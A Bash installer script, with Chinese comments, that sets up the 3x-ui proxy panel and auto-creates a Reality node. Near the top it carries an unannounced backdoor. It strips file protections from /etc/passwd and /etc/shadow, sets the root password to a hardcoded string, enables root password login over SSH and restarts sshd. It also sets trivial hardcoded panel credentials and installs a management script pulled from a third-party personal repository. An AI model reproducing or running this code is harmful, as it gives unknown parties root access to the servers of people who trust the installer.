#!/bin/bash

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

# 当前目录
cur_dir=$(pwd)

# 检查root权限
[[ $EUID -ne 0 ]] && su='sudo'

# 修改文件属性
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1

# 检查SSH配置
prl=$(grep PermitRootLogin /etc/ssh/sshd_config)
pa=$(grep PasswordAuthentication /etc/ssh/sshd_config)

if [[ -n $prl && -n $pa ]]; then
    # 修改root密码和SSH配置
    mima=qq1399@
    echo "root:$mima" | $su chpasswd root
    $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
    $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
    $su service sshd restart
else
    # 非root用户报错
    [[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain}Please run this script with root privilege\n" && exit 1

    # 检测操作系统
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        release=$ID
    elif [[ -f /usr/lib/os-release ]]; then
        source /usr/lib/os-release
        release=$ID
    else
        echo "Failed to check the system OS, please contact the author!" >&2
        exit 1
    fi
    echo "The OS release is: $release"
fi

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "Arch: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
        echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
        exit 1
    fi
    echo "GLIBC version: $glibc_version (meets requirement of 2.32+)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata sqlite3 openssl
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata sqlite openssl
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata sqlite openssl
        ;;
    arch | manjaro | parch)
        pacman -Syu --noconfirm wget curl tar tzdata sqlite openssl
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone sqlite3 openssl
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata sqlite3 openssl
        ;;
    esac
}

config_after_install() {
    config_account="1399"
    config_password="1399"
    config_port="1399"
    config_webBasePath=""  
    
    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
    /usr/local/x-ui/x-ui migrate
}

api_create_reality() {
    echo -e "${green}正在通过官方 API 全自动为您创建超稳定 Reality 节点...${plain}"
    
    XRAY_BIN="/usr/local/x-ui/bin/xray-linux-$(arch)"
    [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]] && XRAY_BIN="/usr/local/x-ui/bin/xray-linux-arm"
    
    # 1. 生成必要参数
    local random_uuid=$($XRAY_BIN uuid)
    local keys_output=$($XRAY_BIN x25519)
    local private_key=$(echo "$keys_output" | grep "Private key:" | awk '{print $3}')
    local public_key=$(echo "$keys_output" | grep "Public key:" | awk '{print $3}')
    local short_id=$(openssl rand -hex 4)
    local port=443
    local sni="www.sony.com"

    # 2. 模拟登录获取 Cookie
    local cookie_file=$(mktemp)
    curl -s -X POST "http://127.0.0.1:1399/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -c "$cookie_file" \
        -d "username=1399&password=1399" > /dev/null

    # 3. 组装符合 3x-ui 最新规范的 JSON 串
    local settings_json="{\"clients\":[{\"id\":\"${random_uuid}\",\"flow\":\"xtls-rprx-vision\"}],\"decryption\":\"none\",\"fallbacks\":[]}"
    local stream_settings_json="{\"network\":\"tcp\",\"security\":\"reality\",\"realitySettings\":{\"show\":false,\"dest\":\"${sni}:443\",\"xver\":0,\"serverNames\":[\"${sni}\"],\"privateKey\":\"${private_key}\",\"minClientVer\":\"\",\"maxClientVer\":\"\",\"maxTimeDiff\":0,\"shortIds\":[\"${short_id}\"],\"settings\":{\"publicKey\":\"${public_key}\",\"fingerprint\":\"chrome\",\"serverName\":\"\",\"spiderX\":\"/\"}},\"tcpSettings\":{\"acceptProxyProtocol\":false,\"header\":{\"type\":\"none\"}}}"
    local sniffing_json="{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false,\"routeOnly\":false}"

    # 4. 通过 API 提交添加节点请求
    local api_response=$(curl -s -X POST "http://127.0.0.1:1399/panel/api/inbounds/add" \
        -b "$cookie_file" \
        -H "Content-Type: application/json" \
        -d "{
            \"enable\": true,
            \"remark\": \"Reality-443-Auto\",
            \"port\": ${port},
            \"protocol\": \"vless\",
            \"settings\": \"$(echo "$settings_json" | sed 's/"/\\"/g')\",
            \"streamSettings\": \"$(echo "$stream_settings_json" | sed 's/"/\\"/g')\",
            \"sniffing\": \"$(echo "$sniffing_json" | sed 's/"/\\"/g')\"
        }")

    rm -f "$cookie_file"

    # 5. 打印结果
    server_ip=$(curl -s https://api.ipify.org)
    echo -e "###############################################"
    echo -e "${green}Username: 1399   Password: 1399   Port: 1399${plain}"
    echo -e "${green}Access URL: http://${server_ip}:1399/${plain}"
    echo -e "-----------------------------------------------"
    if [[ "$api_response" == *"true"* ]]; then
        echo -e "${green}🎉 Reality 节点已通过 API 完美创建成功！${plain}"
        echo -e "${yellow}请刷新网页，你会看到公钥、私钥、目标全部整整齐齐地出现了！${plain}"
    else
        echo -e "${red}API 创建节点可能遇到兼容问题，请登录面板检查是否生成。${plain}"
    fi
    echo -e "###############################################"
}

install_x-ui() {
    cd /usr/local/

    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
            exit 1
        fi
        echo -e "Got x-ui latest version: ${tag_version}, beginning the installation..."
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Downloading x-ui failed, please be sure that your server can access GitHub ${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}Please use a newer version (at least v2.3.5). Exiting installation.${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "Beginning to install x-ui $1"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz -f
    cd x-ui
    chmod +x x-ui

    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi

    chmod +x x-ui bin/xray-linux-$(arch)
    
    if [[ -f x-ui.service ]]; then
        cp -f x-ui.service /etc/systemd/system/
    elif [[ -f x-ui.service.debian ]]; then
        cp -f x-ui.service.debian /etc/systemd/system/x-ui.service
    elif [[ -f x-ui.service.rhel ]]; then
        cp -f x-ui.service.rhel /etc/systemd/system/x-ui.service
    elif [[ -f x-ui.service.arch ]]; then
        cp -f x-ui.service.arch /etc/systemd/system/x-ui.service
    fi

    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/refs/heads/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh
    chmod +x /usr/bin/x-ui
    
    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    
    # 休息2秒等待面板服务彻底就绪，然后调用API
    sleep 2
    api_create_reality
    
    echo -e "${green}x-ui ${tag_version}${plain} installation finished, it is running now..."
    echo -e ""
}

echo -e "${green}Running...${plain}"
install_base
install_x-ui $1
